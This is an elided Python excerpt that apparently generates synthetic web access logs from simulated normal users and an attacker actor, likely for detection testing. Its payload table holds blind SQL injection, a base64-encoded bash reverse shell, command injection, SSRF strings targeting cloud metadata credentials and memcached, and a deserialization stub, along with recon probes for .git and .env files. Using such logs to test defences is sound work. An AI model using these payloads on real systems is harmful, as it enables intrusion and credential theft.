...
ADVANCED_PAYLOADS = {
    "sqli_blind": [
        "1' AND (SELECT 8346 FROM (SELECT(SLEEP(5)))a)--",
    ...
    "rce_b64": [
        "/?cmd=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjE=",
        "/api/ping?ip=127.0.0.1%0Awhoami",
    ],
    "ssrf": [
        "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "/webhook?target=dict://127.0.0.1:11211/",
    ],
    "deserialization": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUQA... (truncated java payload)"
    ],
}
...
class NormalUser(Actor):
    ...
    def next_action(self):
        ...
        self.steps -= 1
        path = random.choice(
            ["/home", "/dashboard", "/api/v1/profile", "/assets/app.js", "/checkout"]
        )
...
class AdvancedPersistentThreat(Actor):
    ...
    def next_action(self):
        if self.phase == 0:
            # Recon
            path = random.choice(
                ["/.git/config", "/.env", "/actuator/health", "/admin/login"]
            )
            ...
            return {
                ...
                "status": 200,
                "bytes": random.randint(5000000, 15000000),
                "latency_ms": 3500,
                "ua": self.ua,
                "cookie": "-",
            }
        ...
        log = {
            ...
            "http": {
                "request": {
                    ...
                    "url": action["path"],
                    "headers": {"user-agent": action["ua"], "cookie": action["cookie"]},
                },
                "response": {
            ...
            "event": {"category": ["web", "network"], "type": ["access"]},
        }
        ...
        try:
            ...
            with open(OUTPUT_FILE, "a") as f:
                while True:
                    ...
                    if (
                        random.random() < 0.6
                    ):  # 60% chance every tick to get new visitors
